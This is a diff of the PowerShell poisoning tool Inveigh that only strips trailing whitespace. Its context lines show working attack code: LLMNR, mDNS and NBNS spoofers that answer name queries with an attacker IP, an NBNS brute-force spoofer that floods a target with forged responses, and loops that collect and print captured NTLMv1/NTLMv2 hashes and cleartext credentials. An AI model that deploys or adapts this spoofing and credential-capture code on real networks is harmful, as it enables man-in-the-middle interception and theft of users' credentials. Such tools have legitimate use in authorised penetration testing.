@@ -2952,9 +2952,9 @@ $sniffer_scriptblock =
                                     {
                                         $LLMNR_response_message = "- something went wrong"
                                     }
-                                
+
                                 }
-                            
+
                             }
 
                             if(!$LLMNR_request_ignore)
@@ -2984,7 +2984,7 @@ $sniffer_scriptblock =
 
                     5355 # LLMNR Response
                     {
-                    
+
                         if($SpooferLearning -eq 'Y' -and $LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                         {
                             $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes[12] + 13)])
@@ -3000,11 +3000,11 @@ $sniffer_scriptblock =
                                 $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                 $LLMNR_query_string = New-Object System.String($LLMNR_query,0,$LLMNR_query.Length)
                             }
-                            
+
                             [Byte[]]$LLMNR_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                             $LLMNR_response_IP = [System.Net.IPAddress]$LLMNR_response_IP_bytes
                             $LLMNR_response_IP = $LLMNR_response_IP.IPAddressToString
-                            
+
                             if($inveigh.valid_host_list -notcontains $LLMNR_query_string)
                             {
                                 $inveigh.valid_host_list.Add($LLMNR_query_string)
@@ -3021,7 +3021,7 @@ $sniffer_scriptblock =
                                 }
 
                             }
-                            
+
                         }
 
                     }
@@ -3039,8 +3039,8 @@ $sniffer_scriptblock =
     $memory_stream.Close()
 }
 
-# Unprivileged LLMNR Spoofer ScriptBlock 
-$LLMNR_spoofer_scriptblock = 
+# Unprivileged LLMNR Spoofer ScriptBlock
+$LLMNR_spoofer_scriptblock =
 {
     param ($Inspect,$LLMNR_response_message,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$LLMNRTTL)
 
@@ -3075,7 +3075,7 @@ $LLMNR_spoofer_scriptblock =
     [Array]::Reverse($LLMNR_TTL_bytes)
 
     while($inveigh.running -and $LLMNR_running)
-    {   
+    {
 
         try
         {
@@ -3100,8 +3100,8 @@ $LLMNR_spoofer_scriptblock =
                                      $LLMNR_TTL_bytes +
                                      0x00,0x04 +
                                      ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
-        
-            $LLMNR_query_string = [Text.Encoding]::UTF8.GetString($LLMNR_request_data[13..($LLMNR_request_data[12] + 12)])     
+
+            $LLMNR_query_string = [Text.Encoding]::UTF8.GetString($LLMNR_request_data[13..($LLMNR_request_data[12] + 12)])
             $source_IP = $LLMNR_listener_endpoint.Address.IPAddressToString
 
             if(!$Inspect -and ($LLMNR_request_data -and $LLMNR_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
@@ -3149,10 +3149,10 @@ $LLMNR_spoofer_scriptblock =
                 {
                     $LLMNR_response_message = "- something went wrong"
                 }
-                                
+
             }
-        
-            if($LLMNR_request_data)                   
+
+            if($LLMNR_request_data)
             {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
 
@@ -3176,8 +3176,8 @@ $LLMNR_spoofer_scriptblock =
     $LLMNR_UDP_client.Close()
  }
 
-# Unprivileged mDNS Spoofer ScriptBlock 
-$mDNS_spoofer_scriptblock = 
+# Unprivileged mDNS Spoofer ScriptBlock
+$mDNS_spoofer_scriptblock =
 {
     param ($Inspect,$mDNS_response_message,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)
 
@@ -3212,7 +3212,7 @@ $mDNS_spoofer_scriptblock =
     [Array]::Reverse($mDNS_TTL_bytes)
 
     while($inveigh.running -and $mDNS_running)
-    {   
+    {
 
         try
         {
@@ -3226,7 +3226,7 @@ $mDNS_spoofer_scriptblock =
             $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
             $mDNS_UDP_client.Client.ReceiveTimeout = 5000
         }
-        
+
         if([System.BitConverter]::ToString($mDNS_request_data) -like '*-00-01-80-01')
         {
             $mDNS_response_packet = $mDNS_request_data[0,1] +
@@ -3236,9 +3236,9 @@ $mDNS_spoofer_scriptblock =
                                     $mDNS_TTL_bytes +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
-                        
+
             $mDNS_query_string = DataToString 13 $mDNS_request_data[12] $mDNS_request_data
-            $mDNS_query_string_full = $mDNS_query_string + ".local"   
+            $mDNS_query_string_full = $mDNS_query_string + ".local"
             $source_IP = $mDNS_listener_endpoint.Address.IPAddressToString
 
             if(!$Inspect -and ($mDNS_request_data -and $mDNS_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (
@@ -3290,10 +3290,10 @@ $mDNS_spoofer_scriptblock =
                 {
                     $mDNS_response_message = "- something went wrong"
                 }
-                                
+
             }
-        
-            if($mDNS_request_data)                   
+
+            if($mDNS_request_data)
             {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
 
@@ -3321,11 +3321,11 @@ $mDNS_spoofer_scriptblock =
                                     $mDNS_TTL_bytes +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
-                        
+
             $mDNS_query_string = DataToString 13 $mDNS_request_data[12] $mDNS_request_data
-            $mDNS_query_string_full = $mDNS_query_string + ".local"   
+            $mDNS_query_string_full = $mDNS_query_string + ".local"
             $source_IP = $mDNS_listener_endpoint.Address.IPAddressToString
-                
+
             if(!$Inspect -and ($mDNS_request_data -and $mDNS_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (
             !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
             $mDNSTypes -contains 'QM') -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP))
@@ -3378,7 +3378,7 @@ $mDNS_spoofer_scriptblock =
 
             }
 
-            if($mDNS_request_data)                   
+            if($mDNS_request_data)
             {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
 
@@ -3403,7 +3403,7 @@ $mDNS_spoofer_scriptblock =
  }
 
 # Unprivileged NBNS Spoofer ScriptBlock
-$NBNS_spoofer_scriptblock = 
+$NBNS_spoofer_scriptblock =
 {
     param ($Inspect,$NBNS_response_message,$SpooferIP,$NBNSTypes,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$NBNSTTL)
 
@@ -3437,7 +3437,7 @@ $NBNS_spoofer_scriptblock =
 
     while($inveigh.running -and $NBNS_running)
     {
-        
+
         try
         {
             $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint)
@@ -3466,7 +3466,7 @@ $NBNS_spoofer_scriptblock =
 
             $source_IP = $NBNS_listener_endpoint.Address.IPAddressToString
             $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
-                    
+
             switch ($NBNS_query_type)
             {
 
@@ -3515,7 +3515,7 @@ $NBNS_spoofer_scriptblock =
             $NBNS_query_string_subtracted = ""
             $NBNS_query_string = ""
             $n = 0
-                            
+
             do
             {
                 $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
@@ -3523,16 +3523,16 @@ $NBNS_spoofer_scriptblock =
                 $n += 1
             }
             until($n -gt ($NBNS_query_string_encoded.Length - 1))
-                    
+
             $n = 0
-                    
+
             do
             {
                 $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                 $n += 2
             }
             until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)
-                                 
+
             if(!$Inspect -and ($NBNS_request_data -and $NBNS_listener_endpoint.Address.IPAddressToString -ne '255.255.255.255') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
             !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
             $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP) -and ($NBNSTypes -contains $NBNS_query_type) -and ($source_IP -ne $IP))
@@ -3584,10 +3584,10 @@ $NBNS_spoofer_scriptblock =
                 {
                     $NBNS_response_message = "- something went wrong"
                 }
-                                    
+
             }
 
-            if($NBNS_request_data)                   
+            if($NBNS_request_data)
             {
                  $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
 
@@ -3612,10 +3612,10 @@ $NBNS_spoofer_scriptblock =
  }
 
 # NBNS BruteForce ScriptBlock
-$NBNS_bruteforce_spoofer_scriptblock = 
+$NBNS_bruteforce_spoofer_scriptblock =
 {
     param ($SpooferIP,$NBNSBruteForceHost,$NBNSBruteForceTarget,$NBNSBruteForcePause,$NBNSTTL)
-   
+
     $NBNSBruteForceHost = $NBNSBruteForceHost.ToUpper()
 
     $hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
@@ -3639,7 +3639,7 @@ $NBNS_bruteforce_spoofer_scriptblock =
         {
             $hostname_bytes[$i] = $hostname_encoded[$i] + 17
         }
-    
+
     }
 
     $NBNS_response_packet = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
@@ -3651,7 +3651,7 @@ $NBNS_bruteforce_spoofer_scriptblock =
                             0x00,0x00,0x00,0x00
 
     $inveigh.console_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")
-    $NBNS_paused = $false          
+    $NBNS_paused = $false
     $NBNS_bruteforce_UDP_client = New-Object System.Net.Sockets.UdpClient(137)
     $destination_IP = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)
     $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
@@ -3666,7 +3666,7 @@ $NBNS_bruteforce_spoofer_scriptblock =
     {
         $inveigh.log.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")
     }
-       
+
     while($inveigh.running)
     {
 
@@ -3696,7 +3696,7 @@ $NBNS_bruteforce_spoofer_scriptblock =
                 for ($j = 0; $j -lt 255; $j++)
                 {
                     $NBNS_response_packet[0] = $i
-                    $NBNS_response_packet[1] = $j                 
+                    $NBNS_response_packet[1] = $j
                     $NBNS_bruteforce_UDP_client.send($NBNS_response_packet,$NBNS_response_packet.Length)
 
                     if($inveigh.hostname_spoof -and $NBNSBruteForcePause)
@@ -3716,11 +3716,11 @@ $NBNS_bruteforce_spoofer_scriptblock =
                         }
 
                     }
-                
+
                 }
-            
+
             }
-        
+
         }
 
         Start-Sleep -m 5
@@ -3730,7 +3730,7 @@ $NBNS_bruteforce_spoofer_scriptblock =
 }
 
 # Control Loop ScriptBlock
-$control_scriptblock = 
+$control_scriptblock =
 {
     param ($ConsoleQueueLimit,$NBNSBruteForcePause,$RunCount,$RunTime)
 
@@ -3773,7 +3773,7 @@ $control_scriptblock =
             }
 
         }
-        
+
         if($inveigh.running)
         {
             Start-Sleep -S 1
@@ -3811,13 +3811,13 @@ $control_scriptblock =
             Start-Sleep -S 1
             $inveigh.relay_running = $false
 
-        } 
+        }
 
         $inveigh.HTTPS = $false
     }
 
     if($NBNSBruteForcePause)
-    {   
+    {
         $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause
     }
 
@@ -3826,7 +3826,7 @@ $control_scriptblock =
     $run_count_cleartext = $RunCount + $inveigh.cleartext_list.Count
 
     if($RunTime)
-    {    
+    {
         $control_timeout = New-TimeSpan -Minutes $RunTime
         $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
@@ -3836,20 +3836,20 @@ $control_scriptblock =
 
         if($NBNSBruteForcePause -and $inveigh.hostname_spoof)
         {
-         
+
             if($inveigh.NBNS_stopwatch.Elapsed -ge $NBNS_pause)
             {
                 $inveigh.hostname_spoof = $false
             }
-        
+
         }
 
         if($RunCount)
         {
-            
+
             if($inveigh.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $inveigh.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $inveigh.cleartext_list.Count -ge $run_count_cleartext)
             {
-                StopInveigh "run count"           
+                StopInveigh "run count"
             }
 
         }
@@ -3918,7 +3918,7 @@ $control_scriptblock =
 # End ScriptBlocks
 # Begin Startup Functions
 
-# HTTP Listener Startup Function 
+# HTTP Listener Startup Function
 function HTTPListener()
 {
     $proxy_listener = $false
@@ -3941,7 +3941,7 @@ function HTTPListener()
 
 Start-Sleep -m 50
 
-# HTTPS Listener Startup Function 
+# HTTPS Listener Startup Function
 function HTTPSListener()
 {
     $proxy_listener = $false
@@ -3964,7 +3964,7 @@ function HTTPSListener()
 
 Start-Sleep -m 50
 
-# Proxy Listener Startup Function 
+# Proxy Listener Startup Function
 function ProxyListener()
 {
     $proxy_listener = $true
@@ -4106,7 +4106,7 @@ if($Proxy -eq 'Y')
 
 # Sniffer/Spoofer Start
 if(($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and $elevated_privilege)
-{ 
+{
     SnifferSpoofer
 }
 elseif(($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$elevated_privilege)
@@ -4154,14 +4154,14 @@ try
     {
 
         if($ConsoleStatus)
-        {    
+        {
             $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
             $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
         }
 
         :console_loop while(($inveigh.running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
         {
-    
+
             while($inveigh.console_queue.Count -gt 0)
             {
 
@@ -4202,11 +4202,11 @@ try
 
                         $inveigh.console_queue.RemoveAt(0)
 
-                    } 
+                    }
 
                     {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
                     {
-                    
+
                         if($ConsoleOutput -ne "Low")
                         {
 
@@ -4223,7 +4223,7 @@ try
 
                         $inveigh.console_queue.RemoveAt(0)
 
-                    } 
+                    }
 
                     default
                     {
@@ -4246,7 +4246,7 @@ try
 
             if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
             {
-            
+
                 if($inveigh.cleartext_list.Count -gt 0)
                 {
                     Write-Output("$(Get-Date -format 's') - Current unique cleartext captures:" + $inveigh.newline)
@@ -4286,7 +4286,7 @@ try
 
                     Start-Sleep -m 5
                 }
-            
+
                 if($inveigh.NTLMv1_list.Count -gt 0)
                 {
                     Write-Output("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
@@ -4345,7 +4345,7 @@ try
                     {
                         Write-Output($NTLMv2_username + $inveigh.newline)
                     }
-                
+
                 }
                 else
                 {
@@ -4364,7 +4364,7 @@ try
                     $inveigh.console_output = $false
                     BREAK console_loop
                 }
-        
+
             }
 
             Start-Sleep -m 5
